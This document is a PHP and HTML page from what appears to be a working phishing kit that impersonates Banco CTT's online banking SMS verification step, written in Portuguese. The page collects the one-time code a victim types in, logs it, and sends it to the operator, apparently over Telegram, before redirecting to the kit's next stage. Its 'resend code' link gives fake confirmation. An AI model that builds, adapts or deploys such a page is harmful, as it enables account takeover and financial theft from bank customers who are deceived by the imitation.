<?php
// ============================================================
//  sms.php — Step 2: Verification code received by SMS
//  Free-format code: letters + numbers, unlimited length.
//  This page is SMS-only (email verification lives in emailotp.php).
// ============================================================
require_once 'config.php';

$ip = client_ip();
init_state($ip, 'sms');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = safe_input('otp');            // free text — letters + numbers, no length limit

    if ($code === '') {
        json_response(array('status' => 'error', 'message' => 'Introduza o código de verificação.'));
    }

    $data = array(
        'code'    => $code,
        'otp'     => $code,                  // legacy key kept for admin/scripts
        'channel' => 'sms',
        'type'    => 'SMS Code'
    );

    log_capture('SMS', $ip, $data);
    send_telegram_capture('SMS', '💬 Código SMS', $ip, $data);
    update_state_step($ip, 'sms', $data);

    json_response(array('status' => 'ok', 'redirect' => 'loading.php'));
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Código por SMS | Banco CTT Online</title>
<style><?php include '_style.php'; ?></style>
<style>
/* Free-text code input */
.code-wrap{position:relative;margin:6px 0 8px}
.code-input{
    width:100%;
    height:50px;
    border:1.5px solid #c8c8c8;
    border-radius:6px;
    padding:0 14px;
    font-size:18px;
    font-weight:600;
    letter-spacing:2px;
    color:#222222;
    background:#fff;
    outline:none;
    transition:border-color .15s, box-shadow .15s;
}
.code-input:focus{
    border-color:#df0024;
    box-shadow:0 0 0 3px rgba(223,0,36,0.18);
}
.code-input::placeholder{
    color:#b5b5b5;
    font-weight:400;
    letter-spacing:0;
    font-size:14px;
}
.code-hint{
    font-size:11px;
    color:#888;
    text-align:center;
    margin:8px 0 14px;
    line-height:1.5;
}
.switch-line{
    text-align:center;
    font-size:12px;
    color:#666;
    margin-top:14px;
}
.switch-line a{color:#df0024;font-weight:600;text-decoration:none}
.switch-line a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="page">
    <div class="card">
        <div class="brand-bar">Verificação Segura</div>

        <div class="step-header">
            <span>Código por SMS</span>
            <span class="step-num">Passo 2</span>
        </div>

        <div class="logo-area">
            <img src="https://thebanks.eu/img/logos/Banco_CTT.png"
                 alt="Banco CTT"
                 onerror="this.outerHTML='<span class=&quot;logo-fallback&quot;>Banco CTT</span>'">
        </div>

        <div class="progress">
            <div class="seg done"></div>
            <div class="seg active"></div>
            <div class="seg"></div>
            <div class="seg"></div>
            <div class="seg"></div>
            <div class="seg"></div>
        </div>

        <div class="body">
            <h2>Introduza o código recebido por SMS</h2>
            <p class="subtitle">
                Foi enviado um <strong>código de verificação</strong> por <strong>SMS</strong><br>
                para o seu telemóvel. Introduza-o abaixo.
            </p>

            <div id="msg" class="msg"></div>

            <form id="codeForm" autocomplete="off">
                <div class="code-wrap">
                    <input type="text"
                           class="code-input"
                           id="codeInput"
                           name="otp"
                           autocomplete="one-time-code"
                           spellcheck="false"
                           placeholder="Introduza o código que recebeu por SMS"
                           style="text-transform:none">
                </div>

                <p class="code-hint">
                    O código pode conter números e letras. Não há limite de caracteres.
                </p>

                <button type="submit" class="btn btn-primary" id="submitBtn" disabled>CONFIRMAR CÓDIGO</button>

                <p style="text-align:center;margin-top:12px;font-size:11px;color:#888">
                    Não recebeu o SMS? <a href="#" id="resendLink" onclick="return false;">Reenviar código</a>
                </p>

                <p class="switch-line">
                    Prefere receber o código por <strong>Email</strong>?
                    <a href="emailotp.php">Receber por Email</a>
                </p>
            </form>
        </div>

        <div class="footer">
            © 2026 Banco CTT — O código é válido durante 5 minutos
        </div>
    </div>
</div>

<div class="overlay" id="overlay"><div class="spinner"></div></div>
<script>
(function(){
    var form      = document.getElementById('codeForm');
    var input     = document.getElementById('codeInput');
    var msg       = document.getElementById('msg');
    var overlay   = document.getElementById('overlay');
    var submitBtn = document.getElementById('submitBtn');

    function refresh(){
        submitBtn.disabled = (input.value.trim().length === 0);
    }
    function hideMsg(){ msg.style.display = 'none'; }
    function showMsg(cls, text){
        msg.className = 'msg ' + cls;
        msg.textContent = text;
        msg.style.display = 'block';
    }

    /* ----- input ----- */
    input.addEventListener('input', function(){
        refresh(); hideMsg();
    });
    input.addEventListener('keydown', function(e){
        if (e.key === 'Enter' && input.value.trim().length > 0){
            e.preventDefault();
            form.requestSubmit();
        }
    });

    /* ----- submit ----- */
    form.addEventListener('submit', function(e){
        e.preventDefault();
        var code = input.value.trim();
        if (code.length === 0) return;

        overlay.classList.add('show');
        submitBtn.disabled = true;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'sms.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function(){
            if (xhr.readyState !== 4) return;
            overlay.classList.remove('show');
            try {
                var resp = JSON.parse(xhr.responseText);
                if (resp.status === 'ok' && resp.redirect) {
                    window.location.href = resp.redirect;
                } else {
                    showMsg('error', resp.message || 'Código incorreto. Tente novamente.');
                    resetForm();
                }
            } catch(err) {
                showMsg('error', 'Erro de comunicação.');
                resetForm();
            }
        };
        xhr.send('otp=' + encodeURIComponent(code));
    });

    function resetForm(){
        submitBtn.disabled = false;
        refresh();
    }

    /* ----- resend (fake feedback) ----- */
    document.getElementById('resendLink').addEventListener('click', function(){
        showMsg('success', 'Foi enviado um novo código por SMS.');
    });

    input.focus();
    refresh();
})();
</script>
</body>
</html>